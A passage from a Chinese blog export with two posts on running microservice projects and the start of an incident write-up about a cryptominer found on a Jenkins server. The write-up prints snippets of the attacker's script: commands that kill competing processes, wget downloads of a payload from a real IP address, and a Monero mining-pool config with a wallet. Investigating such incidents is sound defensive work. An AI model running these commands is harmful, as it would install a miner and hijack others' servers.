去中心化的问题。而根据康威定理，系统的架构会慢慢向去中心化方向发展。\n一定要意识到，这个过程会打破大型系统自上而下的既有流程并采用更有生产力的方式构建新的组织结构。你索要做的就是要充分信任团队，把它看做是一个微型的技术管理创新。不要用老的方式控制团队的运作，这会打击团队的士气。\n管理建议：\n让微服务团队完全脱离之前的工作，专心于微服务的工作中。如果分心同时做几件事，每件事都不会做到最好。 给微服务团队一些特权，为了满足“全功能微服务团队的”诉求，特事特办。 如果团队在执行的过程出现了依赖从而阻碍了进度。则需要把依赖标明出来。代码中的依赖容易看见，但组织中的流程依赖很难发现。 为了避免团队对外部的“依赖惯性”，让团队自己想办法在内部解决依赖。 组织流程的改变也是很重要的微服务架构产物，而不仅仅是微服务代码或基础设施。 技术建议：\n为微服务建立一个全新的代码库，而不要从原先的代码库上克隆或者复制，避免和原团队的开发依赖。 建设一个独立的持续交付流水线，最好是通过“流水线即代码技术”（例如 Jenkinsfile）来自动生成流水线。 步骤2：构建微服务的“电梯演讲” #成立了微服务团队之后，接下来就是要选择第一个实现的微服务。但是这个微服务应该多大，边界在哪是个问题。这不需要进行严格的设计和反复的论证，只要发现当前的痛点或者想要完成一个假设就足够上路了。让整个过程变轻，而不是变重。\n我的建议是通过“微服务电梯演讲”的方式来定义微服务。格式可以是：\n(XX微服务）用来 在（出现痛点的场景）的情况下 解决了（解决现有的某个问题） 从而（达到什么样的效果） 提升了（微服务的价值）\n例如：\n（订单查询微服务）用来 在（订单查询数量快速）的情况下 解决了（访问数量迅速升高导致整体应用性能下降的问题） 从而（分离了订单查询请求） 提升了（提升了其他功能的性能）\n当构造了微服务的电梯演讲，团队就可以以此为原则启动了。当碰到和现有系统冲突的问题，替换几个词比较有帮助你做决策。（语言一定程度上也是具有魔力的）\n把“拆分”换成“移除”。例如：“从现有系统中拆分出订单查询功能” 转变为 ”从现有系统中移除订单查询功能“。思维方式就从一个团队负责两个系统变成了两个团队负责两个系统。\n把“集成”换成“调用”。例如：”用户注册和用户登录需要集成”转变为“用户登录服务需要调用用户注册服务的信息”。思维方式就把两个系统的关系更精确了，从而明确了微服务之间的关系和沟通方式。\n管理建议：\n把微服务的电梯演讲打印出来挂到墙上，让团队成员铭记于心。这会强化组织对微服务的边界认识。 随着团队的反思和学习，电梯演讲有可能会变更，但一定要让团队形成共识好和一致的意见。 不要期望一次就能划分正确。划分是一个持续权衡取舍的过程。 技术建议：\n明确了微服务的职责和边界之后再去看代码，否则会被代码的复杂度影响。 领域驱动设计（DDD）可以帮助你更好的划分微服务。领域驱动设计很好的遵循了“关注点分离”（Separation of concerns，SOC）的原则，提出了更成熟、清晰的分层架构。 不会领域驱动设计（DDD）也没有关系。简单的使用“关注点分离原则”也可以帮你达到这一点。例如：从接口中分离出流量较大的接口独立部署，把读数据库和写数据库的 API 分开独立部署，把静态和动态访问分离……等等。 步骤3：以最小的代价发布出第一个微服务 #要注意两个关键点：一个是“最小的代价”，另一个是“发布”（Release）。\n正如前文所述，微服务架构本身就觉了微服务一定是低成本低风险的渐进式演进。而最大的浪费在于：\n级别/职责分工明确的组织沟通结构。\n“长时间，慢反馈”的行动习惯。\n先进且学习成本较高的技术栈。\n因此，“最小的代价”包含了以下三个方面：\n最精简的独立敏捷全功能团队。\n最快的时间。\n代价最小的技术栈。\n此外，很多微服务的“爱好者”由于害怕失败，因此将微服务技术始终放在“实验室”里。要勇于面对失败，在生产环境中面对真实的问题，但要采取一些规避风险的措施。\n管理建议：\n尽量让现有微服务团队自己学习解决问题，成为全功能团队。如无必要，绝不增添新的人手。 “扯破嗓子不如甩开膀子”，先动起来，在前进中解决问题。 先考虑最后如何发布，根据发布流程倒推。 技术建议：\n根据当前技术采用的情况选择代价较小的技术栈。 采用动态特性开关（Feature Toggle），在发布后可以在生产环境动态的控制微服务的启用，降低失败风险。 如果采用了特性开关，一定要设立删除特性开关和对应旧代码的时间，一般不超过两个月。否则后面大量的特性开关会带来管理成本的提升和代码的凌乱。 由于团队比较小，功能比较单一，不建议采用分支来构建微服务，而应该采用单主干方式开发。 步骤4：取得快速胜利（Quick wins），演示（Showcase）驱动开发 #刚开始进行微服务改造的时候一定会是一个试错的过程。如果目标定得太大，会让团队倍感压力，从而士气低落。而制定每日的短期目标，赢得快速胜利则会不断激励团队的士气。通过设定当天结束的产出来确定今天需要做什么是一个非常有效的办法。\n每日演示（Daily Showcase）就是一种推进产出的做法。每天向团队分享今天的工作内容，使小组能够共同学习。并且以当天或者明天的 showcase 作为目标。每个人showcase 的内容一般不超过20分钟，一天的 showcase 时间不超过一小时。可以早上 showcase，也可以下班后 showcase。\n常见的快速胜利目标如下：\n构造第一条微服务流水线。 上线第一个微服务 HelloWorld 构造出第一个微服务自动化测试。 而以下的目标不适合作为快速胜利的目标：\n构造出微服务 DevOps 平台。 完成整个产品的微服务架构拆分。 构造微服务自动化运维体系。 管理建议：\n要防止团队画大饼，完成好每日和每周的工作目标即可。微服务开发本身就没有很长周期。 强迫团队有所产出，这样才能用关键产出驱动开发。产出不一定是代码或者基础设施，一篇总结，或者学习的文章分享，甚至是踩过的坑和遇到的问题都可以展示，目的是要打造自治学习的团队。 贵在坚持，不要计划太远。超过一个月，就要对目标是不是范围过大进行反思。 以天为单位拆分任务，超过一天的必须要拆分。无法在一天完成的工作需要拆分出阶段性产出。 如果能结对，并且能够每天交换结对，showcase 不必要。 可视化所有任务，用敏捷看板来管理任务是了解现状的最好方式。 技术建议：\n除了让第一个 HelloWord 微服务尽快发布到生产环境，其它的不要想太多。 完成了 HelloWord 的发布，然后要考虑如何对发布流程进行改进。而不是上线业务。 步骤5：代码未动，DevOps 先行 #微服务解耦的本质是把代码内部的复杂性通过一些工具转化外部复杂性。把代码内部的复杂性分散到各个微服务中以降低整体复杂性和架构风险。在这个过程中会大量采用了 DevOps 技术和工具。也可以说，微服务是 DevOps 文化和技术在走到极致的必然结果。\n以 J2EE 的应用为例，以前Web Server + App Server + MiddleWare + Database 的传统架构被代码更少，更多的基础设施工具所取代。因为基础设施相对于代码来说更加稳定，更加利于扩展。\n我把微服务的技术架构问题比作“搭台唱戏”：首先需要建立好微服务交付和运行的平台，然后让微服务上台“唱戏”。\n这个平台一开始不需要很完善，只需要满足生产上线的必要要求即可。而在很多企业里，这个部分是由 Ops 团队在交付流程的末尾把关的。因此，把最后一道关卡的确认工作放到最前面考虑可以减少后期的返工以及不必要的浪费。\n以前，软件的开发和测试过程是分开的。然而，随着 DevOps 运动的兴起和各种自动化运维工具的兴起，这之间的必要性不如从前，只要有足够的自动化测试做质量保证，就可以很快的将微服务快速部署和发布到生产环境上。\n最开始的时候，哪怕是发布一个 Hello World 程序，都表明微服务的持续交付和运行的平台已经搭建好，微服务交付流程已经打通，这一点是重中之重。\n从技术交付产物来说，DevOps 主要交付两点：\n持续交付流水线。\n微服务运行平台。\n为了保证微服务交付的高效，需要把这二者通过自动化的方式有机的结合起来，而不是各为其主。让开发和运维的矛盾变成“自动化的开发运维矛盾”\n此外，DevOps 指的不光是一系列技术，更是一种工作方式。从团队工作方式来说，DevOps 要做到：\n要让 Dev 和 Ops 共同参与决策，设计，实现和维护。\n团队完全独立自主，打破对现有流程的依赖。\n不断的追求改进，让团队行程改进的团队文化。\n管理建议:\n给团队继续前进最大的动力就是新程序快速投入生产。 如果你的组织是 Dev 和 Ops 分离的组织，先咨询一下 Ops 工程师的意见。最好是能够给微服务团队里面配备一名 Ops 工程师。 如果不具备实施 DevOps 的条件，微服务架构就要从运维侧，而不是开发侧开始进行。 技术建议：\n微服务的平台一开始可以很简单，可以以后慢慢增强和扩展。但是一定要部署到生产环境里使用。 如果想使用现成的微服务平台可以参考 Spring Cloud。 微服务运行平台可以通过反向代理和生产环境并行运行。 采用灰度发布技术在生产环境中逐步提升微服务的使用占比。 基础设施即代码是 DevOps 核心实践，可以帮助开发人员迅速在本机构建生产环境相似的开发环境，减少环境的不一致性。可以采用 Docker，Ansible，Vagrant 等工具来完成。 基础设施对微服务应该是透明的。微服务不应该也没必要知道运行环境的细节。只要能够正常启动并执行业务就完成了它的任务。因此，基础设施代码要和微服务业务代码分开，且微服务不应该告诉平台自己如何部署。 服务注册和发现是微服务架构的核心部分。consul 和 Eureka 是这方面的佼佼者。 部署（Deploy）和发布（Release）要分开。 步骤6：除了提交代码和发布，微服务平台一切都应当自动化 #在完成了微服务的基础设施和交付流程之后，就可以开始实现微服务的业务了。这时候需要依据电梯演讲划分出来的微服务进行业务逻辑的开发。在以 DevOps 的方式工作一段时间之后，团队应该养成了一些自动化的习惯，如果没有，就应该检查一下自己的自动化程度。最佳的自动糊理想的状态就是除了代码提交和发布。在这之间的每一个流程和环节都应当由自动化的手段来完成。\n当然，也有不能自动化的部分。根据我的经验，不能自动化的原因主要来自于流程管理的制度要求，而非技术困难。这往往是组织没有依据微服务进行流程变革导致的。这时候需要检讨不能自动化的部分是不是有存在的必要。\n另一方面，虽然自动化可以大量缩短微服务交付时间，提升微服务交付效率。但是自动化的同时需要考虑到安全因素和风险，不能顾此失彼。对于生产来说，可用性和安全性是最重要的部分。\n关键的自动化：\n自动化功能性测试（UI/集成/单元/回归） 自动化构建 自动化部署 自动化性能测试 自动化安全扫描 管理建议：\n鼓励团队成员自发的进行自动化的改进，这会给未来微服务批量开发带来很多裨益。 不要一开始就追求全面的自动化，自动化需要花费一定时间。根据团队的进度视情况适度进行。 技术建议：\n采用 TDD 的方式开发不光可以提升质量，也完成了测试的自动化。 注意自动化的安全隐患。机密信息需要独立管理。 关键步骤需要准备自动手动两种方式，必要时可以干预自动过程。 采用 git 的 hook 技术，在代码 push 之前就可以完成测试和静态检查，提升 CI 的成功率。 步骤7：总结并复制成功经验，建立起微服务交付的节奏 #当完成了第一个微服务，不要着急开始进行下一个微服务的开发。而是需要进行一次关于可复制经验的总结，识别微服务开发中的经验教训并总结成可复制的经验和产出。\n以下是一些需要总结出来的关键产出：\n微服务开发到发布的端到端流程规范。\n微服务开发的技术质量规范。\n团队合作中的坚持的最佳实践。\n常见技术问题总结。\n有了以上的关键产出，就可以对微服务开发团队进行扩张。这时候有了微服务开发的老司机，带着刚加入的同事一起开发，风险会相对低很多。\n管理建议：\n刚开始的时候可以每周进行一个回顾会议，团队需要快速的反馈和调整。 不要急于扩张团队，要在成功经验稳定并形成模式之后再快速扩充。 避免微服务良好的开发氛围被稀释，刚开始的时候扩充团队可以慢一点。新老成员的配比不要超过1:1。 虽然微服务平台趋于稳定，但在微服务没有上规模之前，不要让团队里缺少 Ops 成员。 注意知识的传递和人员的培养。 技术建议：\n不要急于在微服务应用规模不大的时候形成微服务模板，否则会限制未来微服务的开发和扩展。 在微服务不成规模的时候不要放松对微服务平台的改进。 参考书目 #《微服务设计》 是一本微服务各个方面技术的综合参考材料。如果你在实施微服务的过程中碰到了问题，它就是一个解决方案的分类汇总。\n《持续交付》汇集了很多交付最佳实践，当你的微服务实施碰到阻碍时，里面的建议能够让你解决当前的困境。\n《领域驱动设计》和《实现领域驱动设计》为拆分微服务提供了方法论，当团队之间对于微服务的拆分有困难的时候，采用领域驱动的方法往往会得到更好的效果。·\n《微服务那些事儿》是一本快速启动微服务的工具和实践的总结，能够帮助微服务入门者快速跨越门槛。\n","date":"August 16, 2017","permalink":"/blog/2017/2017-08-16-seven-steps-to-start-your-microservices-project/","section":"Blogs","summary":"","title":"提升微服务实施效率的 7 个步骤"},{"content":"笔者从 2013 年加入 ThoughtWorks 至今共 4年时间。在这 4 年的时间里，我分别以 开发人员， DevOps 工程师、DevOps 咨询师、微服务架构师以及微服务咨询师的角色参与了共计 7 个产品和项目的微服务咨询和实施。其中有有成功，有失败，有反思，更多的是学习和总结。以下是我这些年来在微服务咨询上的经验总结，希望能给陷入微服务实施困境的人带来一些帮助。\n难点1：“一步到位”的认知错觉 #这些年微服务大红大紫，但是真正能够拿出来做为可实践的案例少之又少。大部分的微服务案例只能看到微服务架构的“演进结果”。但是看不到微服务架构的“演进过程”。\n这就给很多架构师一个假象：微服务的架构是通过能力极高的架构师一步到位设计出来的。这和很多产品团队自上而下的架构设计风格感受和相似。于是架构师们蜂拥而至，分析和讨论此起彼伏。各种分析方法论层出不穷，讨论和分享络绎不绝。然而真正落地实施的却很少，使得微服务在网络上慢慢变成了一种“玄学”，还停留在“讲道理”的阶段。\n这违反了架构的最基本原则：架构是解决当前的需求和痛点演进的。而不是预先设计出来的。因此，整体的微服务架构设计完全没有必要。如果需要一个集中化的设计，那么如何体现微服务的去中心化轻量级优势?\n可以说这是某些技术咨询公司的一种把戏，通过提升新技术的应用门槛把新技术变成一种稀缺资源。\n从经济学上讲，我相信技术的发展一定是向不断降低成本的方向上发展的。如果新技术没有降低成本反而提升了成本，要么这个新技术有问题，要么一定是姿势不对，走错了路。\n这就引出了了第二个难点：\n难点2：“架构师精英主义” #很多产品对架构师的依赖很大，即“架构师精英主义”：认为产品架构只有这个组织的“技术精英”——架构师才可以完成，而团队其它成员只需要实现架构师的设计和产品经理的决策就可以。\n而微服务架构则是一种“边际革命”：即由一个不超过8个人的小团队就可以完成的工作，两个人甚至都可以完成微服务。而这种规模的团队即使从整个产品团队移除也对整体产品的研发进度没有影响。因此，即使失败了不会带来太多的损失。然而，如果第一个微服务改造成功，那么成功经验的复制带来的乘数效应却能带来很大的收益。\n从架构改造投资的风险收益比来看，这是非常划算的。\n因此，微服务团队完全没必要大张旗鼓，只需要两三个人就可以动工。\n但是，谁也没有微服务的实践经验啊，万一失败了怎么办？\n这就带来了第三个难点：\n难点3：缺乏一个信任并鼓励创新的环境 #面对未知的领域，失败再所难免。而面对这个不确定性频发的世界，成功和失败往往不再重要：也许今天的失败，明天再看，就是成功，反之亦然。\n无论成败，我们都能从行动的过程中有所学习和反思，而这样的经验才是最有价值的。成功仅仅意味着结果符合自己的假设，而失败则意味着结果不符合自己的假设。\n然而，很多组织，尤其“精英主义”的产品团队，责任和压力往往在上层，由于组织庞大，金字塔的结构往往会构建一种以“不信任对方”为基础的制度。这种制度往往营造了一种“宁可不作为，也不能犯错”的文化。由于上层则需要对失败负责，使得任何创新停留在组织的上层的想法，难以落实推进。由于组织的长期合作形成了稳定的工作习惯和思维定势，使得整个组织在面对创新的时候“卡壳”。\n而解决组织“卡壳”的办法就是引入“晃动器”，需要有外部的力量（例如新招聘的高管或外部咨询师）来打破当前的工作习惯和思维定势。组织才可以继续运转下去。\n难点4：微服务技术栈的“选择困难症“ #由于“精英主义”的架构师需要担负很大的责任，因此架构师往往承担着很重的压力。他们必须要为微服务架构谨慎的选择技术栈。因此会在不同的技术栈之间尝试。\n对于习惯了在大型组织里面“长设计，慢反馈”的人们而言。更加认为这样的节奏是理所应当的。\n另一方面，微服务开源社区的快速发展滋长了“架构师焦虑”：如果采用落后的技术会被同行鄙视，被不懂技术的老板鄙视，甚至被下属鄙视。因此架构师们疲于在各种新型的技术栈之间比较和学习。此外，不熟悉技术往往会增大风险，架构师就需要更多的时间研究。带着“一步到位”的架构幻想对微服务技术栈精挑细选。而不会采用现有低成本的方案快速迭代的解决问题。\n以上四点会让大型组织面对微服务实施的时候“卡壳”，而这往往会导致微服务实施容易忽略的最重要一点，我认为也是核心的一点：\n难点5：对微服务的技术变革估计过高，而对微服务带来的组织变革估计严重不足 #作为架构师，永远要不要低估康威定理的威力： “设计系统的组织，其产生的设计和架构等价于组织间的沟通结构。”\n如果你的组织结构是去中心化的小团队结构，那么不用担心，你的应用架构会朝组织架构的方向演进。\n反之，如果你不是一个去中心化的小团队结构，那么微服务的架构会和组织架构格格不入。最好的结果是组织结构随着系统架构的改变而改变，否则产品架构会给组织带来很多沟通问题。\n从制度经济学角度上讲，软件产品本身就是企业内部组织（员工）和外部组织（用户）沟通的代码化制度。这个制度的发展一定是在不断缩小内部组织之间以及内外部组织沟通成本的。\n那么，如何高效的推动微服务架构演进呢？\n如果以上 5 点都让你膝盖中箭。那么根据我个人的经验，综合解决微服务实施难点的第一条建议就是：\n步骤1：以终为始，先构建一个独立的敏捷微服务团队 #我们对微服务的期待就是：可以独立开发，独立部署，独立发布，并且去中心化管理。那么，我们就先构造一只“可以独立开发，独立部署，并且去中心化管理”的团队。\n这个团队为了达到这个目标，会采取各种方法（例如：DevOps，全功能团队）解决阻碍”独立开发，独立部署，独立发布 和 去中心化的问题。而根据康威定理，系统的架构会慢慢向去中心化方向发展。\n一定要意识到，这个过程会打破大型系统自上而下的所有流程并采用更有生产力的方式构建新的组织结构。充分信任团队，不要用老眼光控制团队的运作，这会打击团队的士气。\n管理建议：\n让微服务团队完全脱离之前的工作，如果分心同时做几件事，每件事都不会做到最好。 给微服务团队一些特权，为了满足“全功能微服务团队的”诉求，特事特办。 如果团队在执行的过程出现了依赖从而阻碍了进度。则需要把依赖标明出来。代码中的依赖容易看见，但组织中的流程依赖很难发现。 为了避免团队对外部的“依赖惯性”，让团队自己想办法在内部解决依赖。 技术建议：\n为微服务建立一个全新的代码库，而不要从原先的代码库上克隆或者复制，避免和原团队的开发依赖。 建设一个独立的持续交付流水线，最好是通过“流水线即代码技术”（例如 Jenkinsfile）来自动生成流水线。 步骤2：构建微服务的“电梯演讲” #成立了微服务团队之后，接下来就是要选择第一个实现的微服务。但是这个微服务应该多大，边界在哪是个问题。我的建议是通过“电梯演讲”的方式来定义微服务。格式是：\n（XX微服务）用来 在（出现痛点的场景）的情况下 分离了（预期的效果）\n解决了（当前单块架构的痛点）的问题\n从而（带来的价值）\n例如:\n（订单查询微服务）用来 在（订单查询请求数量激增的）的情况下\n分离了（订单查询请求）\n解决了（因为大量查询导致订单创建性能下降）的问题\n从而（提升了订单系统整体的性能）\n管理建议：\n把微服务的电梯演讲打印出来挂到墙上，让团队成员铭记于心。这会强化组织对微服务的边界认识。 随着团队的反思和学习，电梯演讲有可能会变更，但一定要让团队形成共识好和一致的意见。 不要期望一次就能划分正确。划分是一个持续权衡取舍的过程。 随着团队的划分， 技术建议:\n明确了微服务的职责和边界之后再去看代码，否则会被代码的复杂度影响。\n领域驱动设计（DDD）可以帮助你更好的划分微服务。领域驱动设计很好的遵循了“关注点分离”（Separation of concerns，SOC）的原则，提出了更成熟、清晰的分层架构。\n不会领域驱动设计（DDD）也没有关系。简单的使用“关注点分离原则”也可以帮你达到这一点。例如：从接口中分离出流量较大的接口独立部署，把读数据库和写数据库的 API 分开独立部署，把静态和动态访问分离……等等\n步骤3：以最小的代价发布出第一个微服务 #这里面要注意两个关键点：一个是“最小的代价”，另一个是“发布”（Release）。\n正如前文所述，微服务架构本身就觉了微服务一定是低成本低风险的渐进式演进。而最大的浪费在于：\n1. 级别/职责分工明确的组织沟通结构 2. “长时间，慢反馈”的行动习惯 3. 先进且学习成本较高的技术栈\n因此，“最小的代价”包含了以下三个方面： 1. 最精简的独立敏捷全功能团队 2. 最快的时间 3. 代价最小的技术栈\n此外，很多微服务的“爱好者”由于害怕失败，因此将微服务技术始终放在“实验室”里。要勇于面对失败，在生产环境中面对真实的问题，但要采取一些规避风险的措施。\n管理建议：\n尽量让现有微服务团队自己学习解决问题，成为全功能团队。如无必要，绝不增添新的人手。 “扯破嗓子不如甩开膀子”，先动起来，在前进中解决问题。 先考虑最后如何发布，根据发布流程倒推。 技术建议：\n根据当前技术采用的情况选择代价较小的技术栈。 采用动态特性开关（Feature Toggle），在发布后可以在生产环境动态的控制微服务的启用，降低失败风险。 如果采用了特性开关，一定要设立删除特性开关和对应旧代码的时间，一般不超过两个月。否则后面大量的特性开关会带来管理成本的提升和代码的凌乱。 由于团队比较小，功能比较单一，不建议采用分支来构建微服务，而应该采用单主干方式开发。 步骤4：取得快速胜利（Quick wins），演示驱动开发 #刚开始进行微服务改造的时候一定会是一个试错的过程。如果目标定得太大，会让团队倍感压力，从而士气低落。而制定每日的短期目标，赢得快速胜利则会不断激励团队的士气。通过设定当天结束的产出来确定今天需要做什么是一个非常有效的办法。\n每日演示（Daily Showcase）就是一种推进产出的做法。每天向团队分享今天的工作内容，使小组能够共同学习。并且以当天或者明天的 showcase 作为目标。每个人showcase 的内容一般不超过20分钟，一天的 showcase 时间不超过一小时。可以早上 showcase，也可以下班后 showcase。\n常见的快速胜利如下：\n构造出第一个微服务 Hello Word 构造第一条微服务流水线 构造出第一个微服务自动化测试 而以下的目标不适合作为快速胜利的目标：\n构造出微服务 DevOps 平台 完成产品的微服务架构拆分 构造微服务自动化运维体系 管理建议：\n要防止团队画大饼，完成好每日和每周的工作目标即可。微服务开发本身就没有很长周期。 强迫团队有所产出，这样才能用关键产出驱动开发。产出不一定是代码或者基础设施，一篇总结，或者学习的文章分享，甚至是踩过的坑和遇到的问题都可以展示，目的是要打造自治学习的团队。 贵在坚持，不要计划太远。超过一个月，就要对目标是不是范围过大进行反思。 以天为单位拆分任务，超过一天的必须要拆分。无法在一天完成的工作需要拆分出阶段性产出。 如果能结对，并且能够每天交换结对，showcase 不必要。 可视化所有任务，用敏捷看板来管理任务是了解现状的最好方式。 技术建议：\n除了让第一个 HelloWord 微服务尽快发布到生产环境，其它的不要想太多。 完成了 HelloWord 的发布，然后要考虑如何对发布流程进行改进。而不是上线业务。 步骤5：代码未动，DevOps 先行 #我把微服务的技术架构问题比作“搭台唱戏”：首先需要建立好微服务交付和运行的平台，然后让微服务上台“唱戏”。\n这个平台一开始不需要很完善，只需要满足生产上线的必要要求即可。而在很多企业里，这个部分是由 Ops 团队在交付流程的末尾把关的。因此，把最后一道关卡的确认工作放到最前面考虑可以减少后期的返工以及不必要的浪费。\n以前，软件的开发和测试过程是分开的。然而，随着 DevOps 运动的兴起和各种自动化运维工具的兴起，这之间的必要性不如从前，只要有足够的自动化测试做质量保证，就可以很快的将微服务快速部署和发布到生产环境上。\n最开始的时候，哪怕是发布一个 Hello World 程序，都表明微服务的持续交付和运行的平台已经搭建好。流程已经打通。\nDevOps 不光是一系列技术，更是一种工作方式。\n从技术交付产物来说，DevOps 主要交付两点：\n持续交付流水线 微服务运行平台 为了保证微服务交付的高效，需要把这二者通过自动化的方式有机的结合起来，而不是各为其主。让开发和运维的矛盾变成“自动化的开发运维矛盾”\n从团队工作方式来说，DevOps 要做到：\n要让 Dev 和 Ops 共同参与决策，设计，实现和维护。\n团队完全独立自主，打破对现有流程的依赖。\n不断的追求改进，让团队行程改进的团队文化。\n管理建议：\n给团队继续前进最大的动力就是新程序快速投入生产。 如果你的组织是 Dev 和 Ops 分离的组织，先咨询一下 Ops 工程师的意见。最好是能够给微服务团队里面配备一名 Ops 工程师。 如果不具备实施 DevOps 的条件，微服务架构就要从运维侧，而不是开发侧开始进行。 技术建议：\n微服务的平台一开始可以很简单，可以以后慢慢增强和扩展。但是一定要部署到生产环境里使用。 如果想使用现成的微服务平台可以参考 Spring Cloud 微服务运行平台可以通过反向代理和生产环境并行运行。 采用灰度发布技术在生产环境中逐步提升微服务的使用占比。 基础设施即代码是 DevOps 核心实践，可以帮助开发人员迅速在本机构建生产环境相似的开发环境，减少环境的不一致性。可以采用 Docker，Ansible，Vagrant 等工具来完成。 基础设施对微服务应该是透明的。微服务不应该也没必要知道运行环境的细节。只要能够正常启动并执行业务就完成了它的任务。因此，基础设施代码要和微服务业务代码分开，且微服务不应该告诉平台自己如何部署。 服务注册和发现是微服务架构的核心部分。consul 和 Eureka 是这方面的佼佼者。 部署（Deploy）和发布（Release）要分开。 步骤6：除了提交代码和发布，微服务平台一切都应当自动化 #在完成了微服务的基础设施之后，就可以开始实现微服务的业务了。这时候需要依据电梯演讲划分出来的微服务进行业务逻辑的开发。在以 DevOps 的方式工作一段时间之后，团队应该养成了一些自动化的习惯，如果没有，就应该检查一下自己的自动化程度。最佳的自动糊理想的状态就是除了代码提交和发布。在这之间的每一个流程和环节都应当由自动化的手段来完成。\n当然，也有不能自动化的部分。根据我的经验，不能自动化的原因主要来自于流程管理的制度要求，而非技术困难。这往往是组织没有依据微服务进行流程变革导致的。这时候需要检讨不能自动化的部分是不是有存在的必要。\n另一方面，虽然自动化可以大量缩短微服务交付时间，提升微服务交付效率。但是自动化的同时需要考虑到安全因素和风险，不能顾此失彼。对于生产来说，可用性和安全性是最重要的部分。\n关键的自动化：\n自动化功能性测试（UI/集成/单元/回归） 自动化构建 自动化部署 自动化性能测试 自动化安全扫描 管理建议：\n鼓励团队成员自发的进行自动化的改进，这会给未来微服务批量开发带来很多裨益。 不要一开始就追求全面的自动化，自动化需要花费一定时间。根据团队的进度视情况适度进行。 技术建议：\n采用 TDD 的方式开发不光可以提升质量，也完成了测试的自动化。 注意自动化的安全隐患。机密信息需要独立管理。 关键步骤需要准备自动手动两种方式，必要时可以干预自动过程。 采用 git 的 hook 技术，在代码 push 之前就可以完成测试和静态检查，提升 CI 的成功率。 步骤7：总结并复制成功经验，建立起微服务交付的节奏 #当完成了第一个微服务，不要着急开始进行下一个微服务的开发。而是需要进行一次关于可复制经验的总结，识别微服务开发中的经验教训并总结成可复制的经验和产出。\n以下是一些需要总结出来的关键产出：\n微服务开发到发布的端到端流程规范 微服务开发的技术质量规范 团队合作中的坚持的最佳实践 常见技术问题总结 有了以上的关键产出，就可以对微服务开发团队进行扩张。这时候有了微服务开发的老司机，带着刚加入的同事一起开发，风险会相对低很多。\n管理建议：\n刚开始的时候可以每周进行一个回顾会议，团队需要快速的反馈和调整。 不要急于扩张团队，要在成功经验稳定并形成模式之后再快速扩充。 避免微服务良好的开发氛围被稀释，刚开始的时候扩充团队可以慢一点。新老成员的配比不要超过1:1。 虽然微服务平台趋于稳定，但在微服务没有上规模之前，不要让团队里缺少 Ops 成员。 注意知识的传递和人员的培养。 技术建议：\n不要急于在微服务应用规模不大的时候形成微服务模板，否则会限制未来微服务的开发和扩展。 在微服务不成规模的时候不要放松对微服务平台的改进。 参考书目 #《微服务设计》 是一本微服务各个方面技术的综合参考材料。如果你在实施微服务的过程中碰到了问题，它就是一个解决方案的分类汇总。\n《持续交付》汇集了很多交付最佳实践，当你的微服务实施碰到阻碍时，里面的建议能够让你解决当前的困境。\n《领域驱动设计》和《实现领域驱动设计》为拆分微服务提供了方法论，当团队之间对于微服务的拆分有分歧的时候，可以试试采用领域驱动的方法。\n","date":"August 16, 2017","permalink":"/blog/2017/2017-08-16-five-blocks-to-microservices/","section":"Blogs","summary":"","title":"微服务实施常被忽视的 5 个难点"},{"content":"","date":null,"permalink":"/tags/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/","section":"Tags","summary":"","title":"持续集成"},{"content":"我们的持续集成服务器搭建在AWS上的一个EC2的虚拟机中。采用 Jenkins 2.46.1 并且只有一个Master实例来运行所有的任务。且采用持续部署——团队每天要在开发环境自动部署10+个版本。整个过程由Jenkins内部构建的流水线触发。代码提交，测试，构建，部署一气呵成。\n我们有一个中心产品代码库，这个中心产品对应着不同国家的在线产品。分别是：新加坡，马来西亚，印度尼西亚和香港。为了安全起见，我们为每一个产品的环境单独部署了一套持续交付流水线。由于各地域产品的差异较小，我们采用同一套基础设施配置初始化Jenkins配置，因此，我们有四台差不多的持续交付流水线。\n从一次“构建变慢“的调查说起 #在周二的时候，突然有人发现”马来西亚“的部署流程开始变慢，其中构建过程从上周的的7分钟左右变成了44分钟。而同样的代码改动，其它国家的服务器并没有如此大的差异。\n那么问题一定在这个服务器上！\n影响构建速度的因素主要是资源的占用导致的等待，这方面的资源包括：CPU、内存、磁盘和网络。\n由于我们采用NewRelic对所有的持续集成服务器进行监控。所以可以得到CPU、内存、磁盘和网络的性能监控数据以及横向的对比信息。通过对比相关的数据，我们发现这一台服务器上有个在/tmp目录下运行的叫`donns`的陌生进程长期占用大量CPU，它的文件权限属于Jenkins用户以及Jenkins用户组。所以这个程序的执行是由Jenkins出发了。\n我们在Jenkins的相关网站里搜索这个名为donns进程的相关信息，但一无所获。于是我们在/tmp目录中寻找和这个进程相关的信息，我们发现了一个陌生的Shell脚本，打开内容看，内容却让我们大跌眼镜。以下是几个重要的脚本片段：\n代码片段 1:\n1 2 3 4 5 6 pkill conns ps auxw|head -1;ps auxw|sort -rn -k3|head -1|awk \u0026#39;{if(\\$3\\\u0026gt;80.0) print \u0026#34;kill -9 \u0026#34; \\$2}\u0026#39;|sh pkill bonns 我们看到，这段代码杀死了占用CPU超过80%的进程。此外，杀死了名为conns和bonns的进程。\nconns进程是什么？bonns进程又是什么？为什么要杀死CPU占用率超过80%的进程？\n代码片段 2:\n1 2 3 wget 91.235.143.129:8086/587b626883fdc.png -O /tmp/conn wget 91.235.143.129:8086/1eac80002f.conf -O /tmp/config.conf 从91.235.143.129:8086下载了一个图片和一个配置文件。这个服务器是干嘛的？这个配置文件又包含了哪些内容？\n通过在自己的沙盒环境里打开这个配置文件，发现它的内容是这样的：\n1 2 3 4 5 6 { \u0026#34;url\u0026#34; : \u0026#34;stratum+tcp://xmr.crypto-pool.fr:3333\u0026#34;, \u0026#34;user\u0026#34; : \u0026#34;43ZQzwdYHC9ebXxZhJuwkH5jvmfEBCEjkd1PvqxacrJaEDQFyNuxJhcib8MsJRgFnbATB6rpBEzq8EKqRqUbjyNy3opCS4k\u0026#34;, \u0026#34;pass\u0026#34; : \u0026#34;x\u0026#34; } stratum+tcp 